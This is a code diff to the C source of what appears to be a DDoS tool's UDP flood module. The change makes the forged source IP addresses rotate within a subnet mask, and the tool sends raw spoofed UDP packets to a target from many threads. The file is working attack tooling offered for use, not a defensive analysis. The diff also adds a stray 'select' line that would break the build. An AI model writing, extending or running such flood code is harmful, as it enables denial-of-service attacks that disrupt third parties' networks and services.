@@ -1,6 +1,9 @@
 #include "../header.h"
 #include "../base/make_ipv4.h"
+#include "../base/subnet_mask.h"
 #include "../ddos/udp_flood.h"
+
+select
 
 #define DATA "Hello, This is Data!"
 
@@ -13,6 +16,7 @@ double udp_elapsed_time;
 
 char *udp_dest_ip;
 char *udp_src_ip;
+char *udp_now_ip;
 int udp_src_port;
 int udp_dest_port;
 
@@ -25,12 +29,13 @@ int udp_generated_count;
 
 void udp_flood_print_usage(void)
 {
-	printf("UDP flood Usage : [Src-IP] [Dest-IP] [Src-Port] [Dest-Port] [# thread] [# requests] \n");
+	printf("UDP flood Usage : [Src-IP] [Subnet-Mask(0~32)] [Dest-IP] [Src-Port] [Dest-Port] [# thread] [# requests] \n");
 }
 
 void* generate_udp_request(void *data)
 {
-	int thread_id = *((int*) data);
+	int mask = *((int *)data);
+
 	int sock = make_socket(IPPROTO_UDP);
 	while (1) {
 
@@ -39,14 +44,15 @@ void* generate_udp_request(void *data)
 
 		memset(buffer, 0x00, sizeof(struct udphdr));
 
+		//modify udp_src_ip, increment with subnet masking
+		udp_now_ip = masking_next_ip_addr(udp_src_ip, udp_now_ip, mask);
+
 		//make protocol
 		struct iphdr ipv4_h;
 		ipv4_h = prepare_empty_ipv4();
 		ipv4_h = ipv4_set_protocol(ipv4_h, IPPROTO_UDP);
-		ipv4_h = ipv4_set_saddr(ipv4_h, inet_addr(udp_src_ip));
+		ipv4_h = ipv4_set_saddr(ipv4_h, inet_addr(udp_now_ip));
 
-		//modify udp_src_ip, increment 1.
-		next_ip_addr(udp_src_ip, 1);
 
 		ipv4_h = ipv4_set_daddr(ipv4_h, inet_addr(udp_dest_ip));
 
@@ -91,22 +97,23 @@ void udp_flood_run(char *argv[])
 		argc++;
 	}
 
-	if (argc != 6) {
+	if (argc != 7) {
 		udp_flood_print_usage();
 		return;
 	}
 
 	strcpy(udp_src_ip, argv[0]);
+	int mask = atoi(argv[1]);
 
-	udp_src_port = atoi(argv[2]);
-	udp_dest_port = atoi(argv[3]);
+	udp_src_port = atoi(argv[3]);
+	udp_dest_port = atoi(argv[4]);
 
 	udp_produced = 0;
-	udp_total = atoi(argv[5]);
+	udp_total = atoi(argv[6]);
 
-	int num_threads = atoi(argv[4]);
+	int num_threads = atoi(argv[5]);
 
-	udp_dest_ip = argv[1];
+	udp_dest_ip = argv[2];
 
 	int *generate_thread_id;
 	pthread_t *generate_thread;
@@ -118,9 +125,9 @@ void udp_flood_run(char *argv[])
 
 
 	printf("Sending UDP requests to %s using %d threads\n",udp_dest_ip, num_threads);
-	for (i = 0; i < num_threads; i++)
-		generate_thread_id[i] = i;
 
+	for (i = 0; i < num_threads; i++)
+		generate_thread_id[i] = mask;
 
 	for (i = 0; i < num_threads; i++) 
 		pthread_create(&generate_thread[i], NULL, generate_udp_request,
@@ -131,8 +138,6 @@ void udp_flood_run(char *argv[])
 		pthread_join(generate_thread[i], &status);
 		printf("thread %d joined\n", i);
 	}
-
-
 
 	pthread_mutex_destroy(&udp_mutex);
 	pthread_exit(NULL);
